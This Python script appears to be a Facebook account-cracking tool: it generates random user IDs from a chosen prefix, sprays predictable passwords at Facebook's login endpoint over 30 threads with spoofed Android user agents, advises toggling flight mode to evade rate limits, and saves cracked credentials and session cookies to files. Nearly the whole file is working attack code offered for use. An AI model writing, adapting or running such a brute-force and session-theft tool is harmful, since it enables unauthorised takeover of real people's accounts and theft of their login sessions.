#S9UR9BH
# -*- coding: utf-8 -*-
import os
import sys
import json
import uuid
import string
import random,platform,subprocess,hashlib
import requests,re,time
from concurrent.futures import ThreadPoolExecutor as tred
class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []

    def banner(self):
        os.system("clear" if os.name != "nt" else "cls")
        print("\033[1;37m")
        print("    .d8b   db    db .d8888  ")
        print("   d8' `8b `8b  d8' 88'  YP   ")
        print("   88ooo88  `8bd8'  `8bo     ")
        print("   88~~~88  .dPYb     `Y8b     ")
        print("   88   88 .8P  Y8  db   8D   ")
        print("   YP   YP YP    YP `8888Y' \033[1;32mS4UR4BH")
        print("\033[38;5;250m═════════════════════════════════════════")
        print("\033[1;32m   \033[1;37mTool Owner \033[38;5;208m  \033[1;37mSaurabh Kumar Meena")
        print("\033[1;32m   \033[1;37mGitHub     \033[38;5;208m  \033[1;37mhttps://github.com/BABU-XD")
        print("\033[1;32m   \033[1;37mType       \033[38;5;208m  \033[1;37mRandom")
        print("\033[1;32m   \033[1;37mVersion    \033[38;5;208m  \033[1;39m[v/0.00]")
        print("═════════════════════════════════════════")
    # def method(self, uid, passlist):
    #     for pw in passlist:
    #         # Dummy simulation � replace with actual login logic
    #         print(f"[TRYING] {uid} | {pw}")
    #         if pw.endswith("00"):  # Simulated "OK" condition
    #             print(f"[OK] {uid} | {pw}")
    #             self.oks.append(uid)
    #             break
    #         else:
    #             continue
    #     else:
    #         print(f"[CP] {uid} | {passlist[0]}")
    #         self.cps.append(uid)
    def Main(self):
        self.banner()
        code = input("   Choose Code -  ").strip()
        limit = int(input("   Your Limit  -  ").strip())
        print("═════════════════════════════════════════")
        for _ in range(limit):
            rand_6digit = ''.join(random.choice(string.digits) for _ in range(6))
            self.gen.append(rand_6digit)
        print("   TURN ON/OFF FLIGHT MODE\n")
        print("═════════════════════════════════════════")
        with tred(max_workers=30) as executor:
            for number in self.gen:
                uid = code + number
                passlist = [uid[:6], uid, uid[:8], number[:6], "57273200"]
                executor.submit(self.method, uid, passlist)

        print("\nCLONING COMPLETE.")
        print(f"TOTAL OK: {len(self.oks)}")
        print(f"TOTAL CP: {len(self.cps)}")
        print("═════════════════════════════════════════")
    
    def method(self,ids,passlist):
        global loop,oks,cps
        session = requests.Session()
        #g = random.choice(samsung_user_agent())
        sys.stdout.write(f"\r\r\x1b[m   AXS|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                bal = "https://touch.facebook.com/"
                boro_bara = session.get(bal)
                loda_Lega = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(boro_bara.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(boro_bara.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(boro_bara.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(boro_bara.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
                achha = {
                'authority': 'www.facebook.com',
                'method': 'POST',
                'path': '/login/device-based/regular/login/?login_attempt=1',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '3',
                'origin': 'https://www.facebook.com',
                'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=65206056824&kid_directed_site=0&app_id=65206056824&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv21.0%2Fdialog%2Foauth%3Fapp_id%3D65206056824%26auth_type%3Drerequest%26cbt%3D1741415964339%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1eb602659935f894%2526domain%253Dnz.trustpilot.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fnz.trustpilot.com%25252Ff5d0c25756bdd6f42%2526relation%253Dopener%26client_id%3D65206056824%26display%3Dpopup%26domain%3Dnz.trustpilot.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fnz.trustpilot.com%252Fusers%252Fconnect%253Fredirect%253D%25252freview%25252ffry99.com%2526source_cta%253Dheader%26locale%3Den_US%26logger_id%3Dfc688b31f2f12f51b%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfac2fc392b5952a9f%2526domain%253Dnz.trustpilot.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fnz.trustpilot.com%25252Ff5d0c25756bdd6f42%2526relation%253Dopener%2526frame%253Df2de7a415ddf35f83%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv21.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfac2fc392b5952a9f%26domain%3Dnz.trustpilot.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fnz.trustpilot.com%252Ff5d0c25756bdd6f42%26relation%3Dopener%26frame%3Df2de7a415ddf35f83%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=bn_IN&pl_dbl=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not A(Brand";v="99", "Chromium";v="139"',
                'sec-ch-ua-full-version-list': '"Not A(Brand";v="24.0.0.0", "Chromium";v="137.0.7337.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': iqoo_user_agent(),
                'viewport-width': '980',}
                meRa_Link = "https://www.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
                session.post(url=meRa_Link,data=loda_Lega,headers=achha)
                log_cookies = session.cookies.get_dict().keys()
                if "c_user" in log_cookies:
                    kuki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mOK • {user} • {pas}")
                        print(f"\033[38;5;220mCookies:\033[0m {kuki}")
                        open("/sdcard/AXS-OK.txt", "a").write(user + "|" + pas + "|" + kuki + "\n")
                        self.oks.append(user)
                        break
                elif "checkpoint" in log_cookies:
                    open("/sdcard/AXS-CP.txt", "a").write(ids + "|" + pas + "\n")
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except Exception:
            pass
   
iqoo_user_agent=[]
import random

def iqoo_user_agent():
    android_versions = ["10", "11", "12", "13", "14"]
    iqoo_models = [
        "iQOO Z6", "iQOO Z7 5G", "iQOO 7", "iQOO 9", 
        "iQOO Neo 6", "iQOO Neo 7", "iQOO 11", "iQOO 12"
    ]
    chrome_major = random.randint(110, 126)
    chrome_build = f"{chrome_major}.0.{random.randint(5000, 5999)}.{random.randint(100, 199)}"
    
    ua = (
        f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; "
        f"{random.choice(iqoo_models)}) AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome_build} Mobile Safari/537.36"
    )
    return ua
# Start the script
if __name__ == "__main__":
    Mr_Code().Main()